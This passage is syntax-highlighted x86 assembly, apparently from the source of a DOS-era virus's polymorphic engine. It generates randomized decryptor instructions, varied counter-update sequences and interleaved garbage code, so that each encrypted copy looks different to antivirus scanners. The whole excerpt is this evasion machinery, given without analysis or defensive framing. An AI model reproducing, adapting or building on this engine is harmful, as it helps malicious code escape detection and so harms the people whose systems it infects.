        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TablaIndices</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get the value to cons-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; truct the second opcode</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">                  </span><span class="sc1">; (the data opcode) using in</span><span class="sc0">
                          </span><span class="sc1">; AL the index register</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Put register in opcode</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">    </span><span class="sc1">; Check if a word must be added to index</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto003</span><span class="sc0">    </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">     </span><span class="sc1">; Set word adding to index on</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get word to add to index</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; return</span><span class="sc0">
    </span><span class="sc5">@@Salto003</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc1">; Check if index</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salto004</span><span class="sc0">    </span><span class="sc1">; Register is BP. If not, jump</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Store an adding byte</span><span class="sc0">
    </span><span class="sc5">@@Salto004</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store opcode/adding byte with value 0</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;; Construct a decrypt instruction with direct use of a value (not a register),</span><span class="sc0">
</span><span class="sc1">;; for example XOR WORD PTR [BX],435B</span><span class="sc0">
</span><span class="sc5">@@NoEncripREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Eliminate last bit (it was set on)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Put the opcode in AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Put opcode 80h in AL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">   </span><span class="sc1">; Check if it's byte or word decryption</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salto010</span><span class="sc0">    </span><span class="sc1">; If byte, jump</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Convert to word opcode</span><span class="sc0">
   </span><span class="sc5">@@Salto010</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store 80h or 81h (depending on)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TablaIndices</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get value of the index</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; register for the opcode</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; Set it in the data opcode</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">    </span><span class="sc1">; Check if a word will be added to index</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salto011</span><span class="sc0">    </span><span class="sc1">; If it will be, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc0"> </span><span class="sc1">; Check if index is</span><span class="sc0">
                               </span><span class="sc1">; BP</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto012</span><span class="sc0">    </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store data opcode and continue</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">
    </span><span class="sc5">@@Salto012</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store data opcode</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Store byte to add (with value 0)</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">       </span><span class="sc1">; Continue</span><span class="sc0">
    </span><span class="sc5">@@Salto011</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">     </span><span class="sc1">; Set "add word to index" on</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store this second opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get word to be added in AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">
    </span><span class="sc5">@@Sigue</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get decryption key in AX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">         </span><span class="sc1">; Decrypt by byte or word?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@EncripByte</span><span class="sc0">  </span><span class="sc1">; If byte-to-byte decryption, jump</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store key word</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
 </span><span class="sc5">@@EncripByte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store key byte</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">HazEncriptador</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to add a set of instructions that modifies the counter one up or</span><span class="sc0">
</span><span class="sc1">;; one down, depending on flags in BP</span><span class="sc0">
</span><span class="sc5">ModificaContador</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get counter register in DL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">        </span><span class="sc1">; Check if counter is going fowards</span><span class="sc0">
                        </span><span class="sc1">; or backwards</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Resta</span><span class="sc0">           </span><span class="sc1">; If it goes backwards, then jump</span><span class="sc0">
</span><span class="sc5">@@Suma</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random byte between 0 and 7</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">       </span><span class="sc1">; in AL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonINCbyte</span><span class="sc0">    </span><span class="sc1">; If 0, put "INC Counter"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonADDbyte</span><span class="sc0">    </span><span class="sc1">; If 1, put "ADD Counter,1"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonADDSUBbyte</span><span class="sc0">     </span><span class="sc1">; If 2, put "ADD C.,xxx/SUB C.,yyy"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonSUBADDbyte</span><span class="sc0">     </span><span class="sc1">; If 3, put "SUB C.,xxx/ADD C.,yyy"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBbyte</span><span class="sc0">    </span><span class="sc1">; If 4, put "SUB Counter,-1"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonNOTNEG</span><span class="sc0">     </span><span class="sc1">; If 5, put "NOT Counter/NEG Counter"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSUBDECbyte</span><span class="sc0">     </span><span class="sc1">; If 6, put "SUB C.,-2/DEC Counter"</span><span class="sc0">
</span><span class="sc1">; Put "DEC Counter/ADD Counter,2"</span><span class="sc0">
</span><span class="sc5">@@PonDECADDbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">PonDEC</span><span class="sc0">        </span><span class="sc1">; Store a DEC instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; Insert "ADD Counter,2" (value to</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">        </span><span class="sc1">; add in DH)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Put "SUB Counter,-2/DEC Counter"</span><span class="sc0">
</span><span class="sc5">@@PonSUBDECbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">      </span><span class="sc1">; Insert a "SUB Counter,-2"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonDEC</span><span class="sc0">        </span><span class="sc1">; Insert a "DEC Counter"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;; Here if register is decreased instead of increased</span><span class="sc0">
</span><span class="sc5">@@Resta</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Check if counter register is CX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siggig1</span><span class="sc0">     </span><span class="sc1">; If it isn't, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6000h</span><span class="sc0">   </span><span class="sc1">; Check if we are going to use any of</span><span class="sc0">
                    </span><span class="sc1">; the LOOP instructions or not</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Siggig1</span><span class="sc0">     </span><span class="sc1">; If not, continue</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return (don't insert any counter ope-</span><span class="sc0">
                    </span><span class="sc1">; ration)</span><span class="sc0">
   </span><span class="sc5">@@Siggig1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random byte in AL between 0 and 7</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonDECbyte</span><span class="sc0">     </span><span class="sc1">; If 0, put "DEC Counter"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonADDbyte2</span><span class="sc0">    </span><span class="sc1">; If 1, put "ADD Counter, -1"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBADDbyte2</span><span class="sc0"> </span><span class="sc1">; If 2, put "SUB C.,xxx/ADD C.,yyy"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonADDSUBbyte2</span><span class="sc0"> </span><span class="sc1">; If 3, put "ADD C.,xxx/SUB C.,yyy"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBbyte2</span><span class="sc0">    </span><span class="sc1">; If 4, put "SUB Counter,1"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonNEGNOT</span><span class="sc0">      </span><span class="sc1">; If 5, put "NEG Counter/NOT Counter"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADDADD</span><span class="sc0">      </span><span class="sc1">; If 6, put "ADD C.,xxx/ADD C.,yyy"</span><span class="sc0">
</span><span class="sc1">; Put "ADD C.,xxx/ADD C.,yyy"</span><span class="sc0">
</span><span class="sc5">@@PonSUBSUB</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">     </span><span class="sc1">; Get SUB instruction</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Put register on opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Save AX in CX (this is the opcode)</span><span class="sc0">
       </span><span class="sc5">@@KKEC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random byte in AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; If it's 0, repeat</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKEC</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Put the last opcode in AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Insert it</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Get the subtracted value</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Negate and increase to get a pair of</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; SUBs which decrements the counter at</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; last. Of course, insert this value</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Put "ADD C.,xxx/ADD C.,xxx"</span><span class="sc0">
</span><span class="sc5">@@PonADDADD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">     </span><span class="sc1">; "ADD" opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Add register</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Save opcode in CX</span><span class="sc0">
     </span><span class="sc5">@@KKEC2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random value in AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; If it is 0, repeat</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKEC2</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store this value</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Recover opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Insert it again</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Calculate value to subtract at last</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; one to counter (with 2 adds)</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Complete this instruction with this</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; value and return</span><span class="sc0">

</span><span class="sc1">; Construct "DEC Counter"</span><span class="sc0">
</span><span class="sc5">@@PonDECbyte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonDEC</span><span class="sc0">         </span><span class="sc1">; Put a "DEC"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "ADD Counter,-1"</span><span class="sc0">
</span><span class="sc5">@@PonADDbyte2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Construct this instruction with a -1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">         </span><span class="sc1">; to add to counter</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "SUB C.,xxx/ADD C.,yyy"</span><span class="sc0">
</span><span class="sc5">PonSUBADDbyte2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random byte between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">        </span><span class="sc1">; in AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBADDbyte2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">; Insert a "SUB Counter,&lt;AL Value&gt;"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">         </span><span class="sc1">; Insert a "ADD Counter,&lt;AL Value&gt;-1"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "ADD C.,xxx/SUB C.,yyy"</span><span class="sc0">
</span><span class="sc5">PonADDSUBbyte2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">        </span><span class="sc1">; Get a number between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonADDSUBbyte2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">; Insert an "ADD Counter,&lt;AL Value&gt;"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">         </span><span class="sc1">; Insert a "SUB Counter,&lt;AL Value&gt;+1"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct a "SUB Counter,1"</span><span class="sc0">
  </span><span class="sc5">PonSUBbyte2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">         </span><span class="sc1">; Value to be subtracted</span><span class="sc0">
